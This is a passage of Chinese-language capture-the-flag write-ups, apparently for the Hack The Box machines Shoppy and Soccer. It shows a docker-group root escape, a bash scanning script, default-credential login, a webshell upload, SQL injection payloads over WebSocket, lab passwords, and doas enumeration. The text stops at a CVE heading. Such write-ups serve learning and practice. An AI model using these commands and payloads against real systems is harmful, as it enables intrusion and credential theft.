entries for jaeger on shoppy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser jaeger may run the following commands on shoppy:\n    (deploy) /home/deploy/password-manager\n\n\njaeger@shoppy:~$ ls -l /home/deploy/\ntotal 28\n-rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt\n-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager\n-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp\n</code></pre></p> <p>deploy\u5bb6\u76ee\u5f55\u6709creds.txt\u4f46\u662f\u65e0\u6cd5\u8bfb\u53d6\u3002  </p> <p>\u770b\u770bsudo\u7684\u90a3\u4e2a\u547d\u4ee4\u662f\u5565\uff1a <code>strings /home/deploy/password-manager</code>\uff0c\u6ce8\u610f\u5230\u91cc\u9762\u6709\u6bb5\u6587\u5b57\uff1a<code>cat /home/deploy/creds.txt</code> \u4f3c\u4e4e\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u8bfb\u53d6creds.txt\u3002\u5c1d\u8bd5\u4e00\u4e0b\u6267\u884c\uff1a <pre><code>jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager\nWelcome to Josh password manager!\nPlease enter your master password: Sh0ppyBest@pp!\nAccess denied! This incident will be reported !\n</code></pre></p> <p>\u4f46\u662f\u4e0d\u77e5\u9053\u5bc6\u7801\uff1f\uff1fjosh\u7684\u90a3\u4e2a\u4e0d\u884c\uff0c\u9700\u8981\u4ec0\u4e48master password\u3002\u8ff7\u832b\u2026\u2026</p> <p>\u770b\u4e86\u773cWP\uff0c\u7adf\u7136\u662f\u7528 <code>cat password-manager</code> \u80fd\u53d1\u73b0\u6709\u7528\u7684\u4fe1\u606f\uff0c\u670d\u4e86\u3002\u4e00\u76f4\u60ef\u6027\u89c9\u5f97cat\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u7528\u6bcf\u6b21\u90fd\u76f4\u63a5strings\u4e86\u2026\u2026</p> <pre><code>jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager\nWelcome to Josh password manager!\nPlease enter your master password: Sample\nAccess granted! Here is creds !\nDeploy Creds :\nusername: deploy\npassword: Deploying@pp!\n</code></pre> <p>SSH\u6210\u529f\u767b\u9646 <code>deploy</code> \u7528\u6237\u3002 <pre><code>$ id\nuid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_7","title":"\u63d0\u6743","text":"<p><code>deploy</code> \u7528\u6237\u7684\u8fd9\u4e2a <code>998(docker)</code> \u662f\u4ec0\u4e48\u60c5\u51b5\uff0c\u503c\u5f97\u63a2\u7a76\u4e00\u4e0b\u3002 \u901a\u8fc7gtfobins\u53d1\u73b0\u53ef\u4ee5\u5229\u7528\u3002\u8fd0\u884c\u4e0b\u9762\u547d\u4ee4\u540e\u6210\u529f\u5f97\u5230root shell\uff1a <pre><code>$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# id\nuid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#get-root-flag","title":"get root flag","text":"<pre><code># cd\n# ls\nroot.txt\n# cat root.txt\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_8","title":"\u540e\u8bb0","text":"<p>\u539f\u6765\u662fNoSQL...</p> <p>\u8bf4\u662f\u591a\u4e86\u4e2a\u6a2a\u5411\u79fb\u52a8\u5427\uff0c\u5176\u5b9e\u548c\u4e4b\u524d\u9776\u673a\u6bd4\uff0c\u4ecefoothold\u5f00\u59cb\u83b7\u5f97\u7684\u7528\u6237\u6570\u91cf\u53c8\u6ca1\u5dee\u3002 \u5927\u6982\u662f\u56e0\u4e3a\u8fd9\u6b21\u662fweb\u6253\u70b9\u65f6\u7528\u4e86\u4e00\u4e2a\u8d26\u6237\uff0c\u540e\u6765\u7528\u7684\u53c8\u662f\u4e24\u4e2a\u666e\u901a\u7528\u6237\u7684\u8d26\u6237\u800c\u6ca1\u6709\u5e94\u7528\u8d26\u6237\u5427\u3002</p> <p>\u4ee5\u53ca\u4ee5\u524d\u4e00\u76f4\u89c9\u5f97\u65e2\u7136SSH\u80fd\u6210\u529f\u767b\u9646\uff0c\u5c31\u5df2\u7ecf\u77e5\u9053\u81ea\u5df1\u767b\u9646\u7684\u662f\u4ec0\u4e48\u7528\u6237\uff0c\u90a3\u4e48 <code>id</code> \u547d\u4ee4\u6ca1\u5565\u610f\u4e49\u3002 \u8fd9\u6b21\u968f\u624b\u4e00\u6253\u7adf\u7136\u80fd\u53d1\u73b0deploy\u7528\u6237\u5c5e\u4e8edocker\u7ec4\uff0c\u4ece\u800c\u53d1\u73b0\u7a81\u7834\u53e3\uff0c\u4e5f\u5c5e\u5b9e\u662f\u8fd0\u6c14\u4e86\u2026\u2026</p> <p>\u6700\u540e\uff0c \u8054\u7cfb\u8fd9\u4e2a\u601d\u8def\uff0c\u611f\u89c9\u4fe1\u606f\u641c\u96c6\u53ef\u4ee5\u5f04\u4e00\u4e2a\u7b80\u6613\u811a\u672c\u3002\u4ee5\u540e\u8bd5\u8bd5\u76f4\u63a5\u7528\u8fd9\u4e2a\uff1a</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#htb_easy_firstscaning","title":"HTB_easy_firstScaning","text":"<pre><code>#!/usr/bin/bash\n# -*- coding:utf-8 -*-\n\n## This script is requires root privilege for running.\nset -eu\n\nHTB_IP=${1}\necho \"[info] Starting scan...\"\n\n# --max-retries=0 maybe ok, but sometimes missing some ports. Default is 10.\nports=$(nmap -n -Pn -sS -p 1-10000 ${HTB_IP} --min-rate=5000 --max-retries=1 | grep ^[0-9] | cut -d / -f1 | tr '\\n' ',' | sed s/,$//)\necho \"[info] Opening port: ${ports}\"\n\n# Since nmap scanning is too time-consuming, let it run in background.\nnohup nmap -v -n -Pn -sV -O -p ${ports} --script=vuln ${HTB_IP} &gt; \"${HTB_IP}.nmap\" 2&gt;&amp;1 &amp;\n\nif [[ ${ports} =~ '80' ]];then\n  HTB_DOMAIN=$(curl -I ${HTB_IP} | grep -oP '(?&lt;=Location: http://).*' | tr -d '/\\r')\n  echo \"[info] domain: ${HTB_DOMAIN}\"\n\n  if [[ ${HTB_DOMAIN} != '' ]];then\n    # for backup\n    cat -e /etc/hosts\n    echo \"-------- Backed up hosts --------\"\n\n    echo \"${HTB_IP}    ${HTB_DOMAIN}\" &gt;&gt; /etc/hosts\n\n    cat -e /etc/hosts\n    echo \"-------- Modified hosts --------\"\n\n    echo \"[info] Scanning subdomain...\"\n    gobuster vhost -u ${HTB_DOMAIN} -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 500 --append-domain -o \"subdomains_${HTB_DOMAIN}.txt\"\n    echo \"[info] End of subdomain scan...\"\n  fi\nfi\n\nps -ef | grep 'nmap -v -n -Pn'\necho \"[info] Please check nmap status with: ps -ef | grep 'nmap -v -n -Pn'\"\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/","title":"HTB-Soccer","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_1","title":"\u626b\u63cf","text":"<p>\u5f00\u59cb\u5c1d\u8bd5\u7528\u81ea\u5df1\u5199\u7684\u8fd9\u4e2a\u811a\u672c\u8fdb\u884c\u9996\u5148\u7684\u57fa\u7840\u626b\u63cf\uff0c\u5b50\u57df\u626b\u5b8c\u4e4b\u540e\u679a\u4e3e\u76ee\u5f55\u3002</p> <ul> <li>\u6d3b\u52a8\u7aef\u53e3\uff1a22\uff0c80\uff0c9091</li> <li>\u6ca1\u53d1\u73b0\u5b50\u57df</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#80","title":"80\u7aef\u53e3","text":"<p><code>http://soccer.htb/</code> \u4f3c\u4e4e\u5c31\u662f\u4e2a\u9759\u6001\u9875\u9762\u3002</p> <ul> <li>\u65e0robots  </li> <li>\u7f51\u9875\u6e90\u7801\u65e0\u53d1\u73b0 </li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a/tiny</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_3","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<p><code>http://soccer.htb/tiny</code> \u662f\u4e2a\u767b\u9646\u754c\u9762\u3002</p> <p>\u7b80\u5355\u8bd5\u4e86\u4e0bSQLi\u4f3c\u4e4e\u4e0d\u884c\u3002\u4e5f\u59d1\u4e14\u4e0d\u592a\u60f3\u76f4\u63a5\u66b4\u7834\u3002\u731c\u6d4b\u5e94\u8be5\u662f\u5f31\u5bc6\u7801\u6216\u8005\u6709exploit\u3002 \u4f46\u662f\u5f53\u65f6\u6ca1\u627e\u5230\u54ea\u91cc\u6709\u5199\u7248\u672c\uff0c\u540e\u6765\u53d1\u73b0\u7f51\u9875\u6e90\u7801\u5c31\u6709\u5199\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u957f\u4e86\u6ca1\u770b\u5230\u2026\u2026\u53ea\u7528\u534a\u5c4f\u7684\u9505\uff08\uff08 footer\u6709\u4e2a\u94fe\u63a5\uff0c\u4f3c\u4e4e\u662f\u8fd9\u4e2a\u5e94\u7528\u7684\u6e90\u7801\u3002\u89c9\u5f97\u4f7f\u7528\u9ed8\u8ba4\u5bc6\u7801\u7684\u53ef\u80fd\u6027\u8f83\u5927\uff0c\u76f4\u63a5\u53bb\u7ffb\u6587\u6863  </p> <ul> <li> <p>\u627e\u5230\u9ed8\u8ba4\u5bc6\u7801  </p> <p>Default username/password: admin/admin@123 and user/12345.</p> </li> <li> <p>\u987a\u4fbf\u7559\u4e2a\u5fc3\u773c\uff1a</p> <ul> <li>\u6587\u6863\u8981\u6c42\u540e\u7aefPHP\u89815.5.0\u4ee5\u4e0a</li> <li>\u4ee5\u53ca\u4ecb\u7ecd\u4e86docker\u90e8\u7f72\u2014\u2014\u6240\u4ee5\u53ef\u80fdget shell\u4e4b\u540e\u8fdb\u5165\u7684\u662f\u5bb9\u5668\u91cc </li> </ul> </li> </ul> <p>\u5c1d\u8bd5\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u6210\u529f\u767b\u5165\u3002 \u91cc\u9762\u5c31\u662f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u6e90\u7801\u8d44\u6e90\u3002<code>tiny</code> \u6587\u4ef6\u5939\u91cc\u6709\u4e2a <code>uploads</code> \u6587\u4ef6\u5939\uff0c\u4f30\u8ba1\u80fd\u5728\u8fd9\u91cc\u4e0a\u4f20webshell\u2014\u2014\u5f53\u7136\uff0c\u7528php\u7684\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#foothold","title":"foothold","text":"<p>kali\u81ea\u5e26php\u53cd\u5f39shell\uff08<code>/usr/share/webshells/php/</code>\uff09\uff0c\u7f51\u4e0a\u4e5f\u80fd\u7b80\u5355\u641c\u5230\u3002</p> <p>\u5f00\u76d1\u542c\uff0c\u5728 <code>uploads</code> \u6587\u4ef6\u5939\u4e0a\u4f20webshell\uff0c\u89e6\u53d1\u540e\u6210\u529f\u8fdb\u5165\u673a\u5668\u3002\u662f <code>www-data</code> \u7528\u6237\uff1a \u6211\u628akali\u81ea\u5e26\u7684\u90a3\u4e2awebshell\u91cc\u7684 <code>sh -i</code> \u6539\u6210\u4e86 <code>bash -i</code> <pre><code>www-data@soccer:/$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre></p> <p>\u7531\u4e8e\u6ca1\u8fd9\u4e2a\u8d26\u6237\u7684\u5bc6\u7801\uff08\u65e0\u6cd5\u770b<code>sudo -l</code>\uff09\uff0c\u6240\u4ee5\u6211\u5c31\u4f1a\u5148\u5c1d\u8bd5\u679a\u4e3eSUID\uff1a <pre><code>$ find / -perm -4000 2&gt;/dev/null\n/usr/local/bin/doas\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/umount\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/at\n</code></pre></p> <p>\u7531\u4e8e\u5bf9GTFOBins\u91cc\u7684 <code>at</code> \u6709\u5370\u8c61\u6240\u4ee5\u5148\u8bd5\u4e86\u4e0b\u8fd9\u4e2a\uff0c\u4e0d\u8fc7\u4f1a\u62a5\u9519\u3002 \u4f46\u662f\u518d\u4ed4\u7ec6\u770b\u4e00\u4e0b\u5176\u5b9e\u8fd9\u4e2aSUID\u4e0d\u662froot\u6743\u9650\uff0c\u4e5f\u5c31\u653e\u5f03\u4e86\u8fd9\u6761\u8def\u3002</p> <p>-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at</p> <p>\u53e6\u5916\u6311\u4e86\u51e0\u4e2a\u53ef\u7591\u7684\u5728GTFOBins\u91cc\u641c\u4e86\u641c\uff0c\u4f3c\u4e4e\u90fd\u4e0d\u80fd\u63d0\u6743\u3002\u672c\u6765\u89c9\u5f97easy\u673a\u5668\u5230\u8fd9\u79cd\u7a0b\u5ea6\u5c31\u5dee\u4e0d\u591a\u6709\u4e86\u2026\u2026</p> <p>\u60f3\u8d77\u6765\u4e0a\u4f20\u7684webshell\u4e00\u76f4\u90fd\u6709\u88ab\u5b9a\u65f6\u5220\u9664\uff0c\u4e8e\u662f\u53c8\u770b\u4e86\u773ccron\u3002\u4e0d\u8fc7\u7531\u4e8e\u90fd\u6ca1\u6709\u5199\u5165\u6743\u9650\uff0c\u6240\u4ee5\u4e5f\u653e\u5f03\u4e86\u3002</p> <p>\u90a3\u4e48\u679a\u4e3e\u4e00\u4e0b\u6240\u6709\u6709\u5199\u5165\u6743\u9650\u7684\u3002\u5438\u53d6\u4e0a\u9762\u7684\u6559\u8bad\uff0c\u8fd9\u6b21\u663e\u793a\u4e00\u4e0b\u6743\u9650\uff1a <pre><code>find / -perm -222 2&gt;/dev/null -type f -exec ls -l {} \\;\n</code></pre></p> <p>\u8f93\u51fa\u592a\u591a\u4e86\uff0c\u9650\u5b9a\u4e3aroot\u770b\u770b\uff1a <pre><code>find / -user root -perm -222 2&gt;/dev/null -type f -exec ls -l {} \\;\n</code></pre></p> <p>\u4e0d\u8fc7\u770b\u4e86\u773c\u5404\u884c\u5f00\u5934\u7684\u76ee\u5f55\u540d\u4f3c\u4e4e\u90fd\u4e0d\u50cf\u80fd\u5229\u7528\u7684\u2026\u2026</p> <p>\u9677\u5165\u957f\u65f6\u95f4\u8ff7\u832b\u2026\u2026 \u8fd9\u65f6\u5019\u5149\u60f3\u7740\u63d0\u6743\uff0c\u8fdb\u6765\u4e4b\u540e\u6839\u672c\u8fd8\u6ca1\u62ffflag\u2014\u2014\u5df2\u7ecf\u5b8c\u5168\u5fd8\u8bb0\u81ea\u5df1\u7684\u76ee\u7684\u662f\u4ec0\u4e48\u4e86\u2026\u2026\u5e94\u8be5\u62ffuser\u7684flag\u800c\u4e0d\u662f\u60f3\u7740\u62ffroot\u6743\u9650\u3002home\u76ee\u5f55\u6709\u53e6\u4e00\u4e2a\u7528\u6237\uff1aplayer\uff0c\u867d\u7136\u4e5f\u6ca1\u6709\u627e\u4ed6\u7684\u5176\u5bc6\u7801\u3002 \u8fd9\u65f6\u5019\u770b\u5230Forum\u6709\u4e2a\u5144\u5f1f\u63d0\u5230\u4e86nginx\u914d\u7f6e\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_4","title":"\u65b0\u53d1\u73b0\uff1a\u53e6\u4e00\u4e2a\u7f51\u9875","text":"<p>\u6839\u636eForum\u7684\u7ebf\u7d22\uff0c\u5728\u673a\u5b50\u4e0a\u627e\u4e86\u4e00\u4e0b<code>nginx.conf</code>\uff0c\u6ce8\u610f\u8fd9\u4e00\u5757\uff1a <pre><code>##\n# Virtual Host Configs\n##\n\ninclude /etc/nginx/conf.d/*.conf;\ninclude /etc/nginx/sites-enabled/*;\n</code></pre></p> <p>\u4f1a\u53d1\u73b0\u6709\u4e24\u4e2a\u7f51\u9875\uff0c<code>default</code>\u5c31\u662f\u6211\u4eec\u6700\u5f00\u59cb\u8fdb\u5165\u7684\u90a3\u4e2a\u9875\u9762\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f<code>soc-player.htb</code>\uff1a <pre><code>www-data@soccer:/$ ls /etc/nginx/sites-enabled/\ndefault\nsoc-player.htb\n\n\nwww-data@soccer:/$ cat /etc/nginx/sites-enabled/soc-player.htb\nserver {\n        listen 80;\n        listen [::]:80;\n\n        server_name soc-player.soccer.htb;\n\n        root /root/app/views;\n\n        location / {\n                proxy_pass http://localhost:3000;\n                proxy_http_version 1.1;\n                proxy_set_header Upgrade $http_upgrade;\n                proxy_set_header Connection 'upgrade';\n                proxy_set_header Host $host;\n                proxy_cache_bypass $http_upgrade;\n        }\n\n}\n</code></pre></p> <p>\u6700\u5f00\u59cb\u7684\u626b\u63cf\u4e5f\u6709\u626b\u8fc7\u5b50\u57df/\u865a\u62df\u4e3b\u673a\uff0c\u4e0d\u8fc7\u5f53\u65f6\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\u3002\uff08\u5e76\u6ca1\u6709\u8fd9\u4e48\u5201\u94bb\u7684\u5b57\u5178\uff0c\u6216\u8bb8\u53ef\u4ee5\u7528 <code>CeWL\u5de5\u5177</code> \u57fa\u4e8e\u4e4b\u524d\u7684\u7f51\u7ad9\u751f\u6210\u4e2a\u5b57\u5178\uff1f\uff09 </p> <p>\u5c06\u5176\u52a0\u5165hosts\u540e\u8bbf\u95ee\u3002\u540c\u6837\u662f\u4e00\u4e2a\u9759\u6001\u7f51\u7ad9\u3002\u5185\u5bb9\u597d\u50cf\u548c\u4e4b\u524d\u90a3\u4e2a\u7f51\u7ad9\u4e00\u6837\u3002\u4e0d\u8fc7\u6709\u767b\u9646\u3001\u6ce8\u518c\u529f\u80fd\u3002  </p> <ul> <li>\u65e0robots  </li> <li>\u7f51\u9875\u6e90\u7801\u65e0\u53d1\u73b0\uff08\u6682\u65f6\uff09</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u9664\u4e86\u4e00\u4e9b\u80fd\u770b\u5230\u7684\u767b\u9646\u3001\u6ce8\u518c\uff0c\u8fd8\u6709\u4e00\u4e9b\u9759\u6001\u8d44\u6e90\u3002\u6ca1\u5176\u4ed6\u7279\u6b8a\u9879\u76ee</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_5","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<p>\u767b\u9646\u754c\u9762\u5c1d\u8bd5\u4e86\u4e00\u4e0bSQLi\uff0c\u4f3c\u4e4e\u4e0d\u592a\u884c\u3002\u968f\u4fbf\u6ce8\u518c\u4e00\u4e2a\u53f7\u8bd5\u8bd5\u7adf\u7136\u80fd\u767b\u9646\u3002</p> <p>\u767b\u9646\u540e\u7684\u9875\u9762\uff08<code>/check</code>\uff09\u4f3c\u4e4e\u4ec5\u4ec5\u7528\u6765\u8f93\u5165\u7968\u53f7\u4ee5\u786e\u8ba4\u662f\u5426\u5b58\u5728\u3002</p> <p>\u5c1d\u8bd5SQLi\uff0c\u662f\u6570\u5b57\u578b\u6ce8\u5165\uff0c\u4f3c\u4e4e\u7531\u4e8e\u52a0\u51cf\u53f7\u88ab\u7528\u6765\u8fd0\u7b97\u6240\u4ee5\u6ce8\u91ca\u7b26\u662f\u4e95\u53f7\u3002 \u5176\u5b9e\u5bf9SQLi\u6ca1\u6709\u4e86\u89e3\u592a\u6df1\u2026\u2026 \u59d1\u4e14\u5c1d\u8bd5\u51fa\u8fd9\u662f3\u5217\uff0c\u4f46\u662f\u56e0\u4e3a\u7f51\u9875\u53ea\u8fd4\u56de\u7968\u53f7\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u7ed3\u679c\uff0c\u6ca1\u6709\u5176\u4ed6\u56de\u663e\u4f4d\u7f6e\uff0c\u6240\u4ee5\u5e94\u8be5\u65e0\u6cd5\u4ece\u8fd9\u4e2a\u7f51\u9875\u83b7\u5f97\u4ec0\u4e48\u4fe1\u606f\u3002</p> <pre><code>81574 and 1=1 order  by 3\n\nand 1=1 UniOn Select 1,2,3 fRoM information_schema.schemata\n\nUniOn Select 1,2,schema_name fRoM information_schema.schemata\n</code></pre> <p>\u7136\u540e\u4e71\u901b\u4e71\u70b9\u4e86\u4e00\u9635\u5b50</p> <ul> <li>\u6ce8\u610f\u5230\u6211\u5728 <code>/check</code> \u9875\u9762\u53d1\u9001\u7684\u8bf7\u6c42\u5e76\u6ca1\u6709\u663e\u793a\u5728burp\u7684 <code>HTTP history</code> \u91cc</li> <li> <p>\u7528\u68c0\u67e5\u7f51\u9875\u5143\u7d20\u7684\u65b9\u5f0f\uff08Ctrl+Shift+C\uff09\u70b9\u51fb <code>/check</code> \u9875\u9762\u7684\u8f93\u5165\u6846\u770b\u770b\uff0c\u53d1\u73b0\u8fd9\u91cc\u6709\u4e2a <code>event</code>\uff0c\u70b9\u4e86\u51e0\u4e0b\u8fdb\u5165\u5230Debugger\u754c\u9762</p> <p></p> </li> </ul> <p>\u540e\u6765\u53d1\u73b0\u8fd9\u5c31\u662f\u7f51\u9875\u6e90\u7801\u7684script\u90e8\u5206: <pre><code>&lt;script&gt;\n    var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\");\n    window.onload = function () {\n\n    var btn = document.getElementById('btn');\n    var input = document.getElementById('id');\n\n    ws.onopen = function (e) {\n        console.log('connected to the server')\n    }\n    input.addEventListener('keypress', (e) =&gt; {\n        keyOne(e)\n    });\n\n    function keyOne(e) {\n        e.stopPropagation();\n        if (e.keyCode === 13) {\n            e.preventDefault();\n            sendText();\n        }\n    }\n\n    function sendText() {\n        var msg = input.value;\n        if (msg.length &gt; 0) {\n            ws.send(JSON.stringify({\n                \"id\": msg\n            }))\n        }\n        else append(\"????????\")\n    }\n    }\n\n    ws.onmessage = function (e) {\n    append(e.data)\n    }\n\n    function append(msg) {\n    let p = document.querySelector(\"p\");\n    // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);\n    // p.style.color = randomColor;\n    p.textContent = msg\n    }\n&lt;/script&gt;\n</code></pre></p> <p>\u539f\u6765\u6700\u5f00\u59cb\u626b\u63cf\u51fa\u6765\u76849091\u7aef\u53e3\u662f\u8fd9\u91cc\u7528\u7684\u554a\uff0c\u4ee5\u53ca\u8fd9\u91cc\u7684\u6570\u636e\u4f20\u8f93\u662f\u7528 <code>WebSocket</code>\uff0c\u4ee5\u524d\u4e5f\u53ea\u662f\u5927\u6982\u4e86\u89e3\u4e86\u4e00\u4e0b\uff0c\u8981\u5b9e\u9645\u4e0a\u624b\u5206\u6790\u8fd8\u662f\u7b2c\u4e00\u6b21\u3002  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_6","title":"\u6a2a\u5411\u79fb\u52a8","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#poc","title":"PoC","text":"<p><code>websocket sqli</code> \u8c37\u6b4c\u4e00\u6ce2\uff0c\u53d1\u73b02\u4e2a\u6781\u5176\u6709\u53c2\u8003\u610f\u4e49\u7684\u7f51\u7ad9\uff1a  </p> <p>https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html https://www.youtube.com/watch?v=WTDqlunipXE</p> <p>\u7b2c\u4e00\u4e2a\u7f51\u7ad9\u662fPoC\u6587\u7ae0\uff0c\u4e00\u5f00\u59cb\u5149\u770b\u6587\u7ae0\u6ca1\u592a\u660e\u767d\uff0c\u7136\u540e\u53d1\u73b0\u7b2c\u4e8c\u4e2a\u90a3\u4e2a\u89c6\u9891\u7b97\u662f\u624b\u628a\u624b\u6559\u4e86\u3002 \u4e00\u5f00\u59cb\u8df3\u7740\u770b\uff0c\u770b\u5230\u91cc\u9762\u7528burp\u6765Repeater\u6211\u90fd\u60ca\u4e86\uff0c\u6211\u6839\u672c\u6ca1\u6293\u5230history\u554a\u3002\u4ece\u5934\u7f15\u4e86\u4e00\u904d\uff0c\u539f\u6765\u53ea\u8981\u5f00\u542f\u62e6\u622a\u5c31\u80fd\u6293\u5230WebSocket\u7684\u8bf7\u6c42\u2026\u2026\u6ca1\u8fd9\u4e60\u60ef\uff0cburp\u4e00\u76f4\u90fd\u662f\u7528\u6765\u770bhistory\u7684\u2026\u2026 \u4ee5\u53ca\u540e\u6765\u53d1\u73b0\u539f\u6765\u6709\u4e2a <code>WebSockets history</code> \u5c31\u5728 <code>HTTP history</code> \u65c1\u8fb9\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_7","title":"\u76f2\u6ce8\u66b4\u5e93","text":"<p>\u63a5\u4e0b\u6765\u5c31\u7b80\u5355\u4e86\uff0c\u7ed3\u5408\u8fd9\u4e24\u4e2a\u7f51\u7ad9\uff0c\u81ea\u5df1\u4e5f\u5f04\u4e00\u6ce2ws\u7684\u76f2\u6ce8\u3002\u6210\u529f\u66b4\u51fa\u6709\u7528\u7684\u4fe1\u606f\uff1a <pre><code>available databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] soccer_db\n[*] sys\n\n\ncurrent user: 'player@localhost'\nDatabase: soccer_db\n[1 table]\n+----------+\n| accounts |\n+----------+\nDatabase: soccer_db\nTable: accounts\n[1 entry]\n+------+-------------------+----------------------+----------+\n| id   | email             | password             | username |\n+------+-------------------+----------------------+----------+\n| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |\n+------+-------------------+----------------------+----------+\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#get-user-flag","title":"get user flag","text":"<p>\u4f7f\u7528\u4e0a\u8ff0\u8d26\u6237\u4fe1\u606f\uff0c\u6210\u529f\u7528 <code>player</code> \u767b\u9646SSH\u3002\u83b7\u5f97user flag\uff1a <pre><code>-bash-5.0$ id\nuid=1001(player) gid=1001(player) groups=1001(player)\n-bash-5.0$ ls\nuser.txt\n-bash-5.0$ cat user.txt\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_8","title":"\u63d0\u6743","text":"<p>\u60ef\u4f8b\u5148\u770b\u4e00\u773c <code>sudo -l</code>\uff0c\u663e\u793a\u6ca1\u6709sudo\u6267\u884c\u3002\u7136\u540e\u770b\u770bSUID\uff1a <pre><code>-bash-5.0$ sudo -l\n[sudo] password for player: \nSorry, user player may not run sudo on localhost.\n-bash-5.0$ find / -perm -4000 2&gt;/dev/null\n/usr/local/bin/doas\n\u2026\u2026\n</code></pre></p> <p>\u5176\u5b9e\u63d0\u6743\u5229\u7528\u7684\u5c31\u662f\u8fd9\u4e2a <code>doas</code>\uff0c\u4e0d\u8fc7\u6211\u6700\u5f00\u59cb\u9519\u8fc7\u4e86\u3002\u8fd8\u82b1\u4e86\u4e00\u4e9b\u65f6\u95f4\u53bb\u626b\u63cf\uff0c\u5982\u7528LinEnum\uff0c\u4e5f\u5e76\u672a\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\u3002</p> <p>\u4e0d\u8fc7\u5176\u5b9e\u5c31\u7b97\u4e00\u5f00\u59cb\u4e0d\u77e5\u9053\u8fd9\u4e2adoas\uff0c\u53ea\u8981\u8c37\u6b4c\u4e00\u4e0blinux\u63d0\u6743\u4ec0\u4e48\u7684\uff0c\u4e5f\u80fd\u627e\u5230\u4e00\u4e9b\u6587\u7ae0\u4f1a\u63d0\u5230\u8fd9\u4e2a\u547d\u4ee4\u7684\u63d0\u6743\u3002\u60f3\u60f3\u4e5f\u786e\u5b9e\u7b97\u662f\u57fa\u672c\u6280\u80fd\u4e86\u3002  </p> <p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation#doas https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/#doas </p> <p>There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf</p> <p>\u770b\u4e86\u773c\u6ca1\u6709 <code>/etc/doas.conf</code>\uff0c\u4e0d\u8fc7\u641c\u5230\u5728\u53e6\u4e00\u4e2a\u5730\u65b9\uff1a <pre><code>player@soccer:~$ find / -name doas.conf 2&gt;/dev/null\n/usr/local/etc/doas.conf\nplayer@soccer:~$ cat /usr/local/etc/doas.conf \npermit nopass player as root cmd /usr/bin/dstat\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#poc-cve-2009-3894","title":"PoC (CVE-2009-3894)","text":"<p>\u5373\uff1a\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c 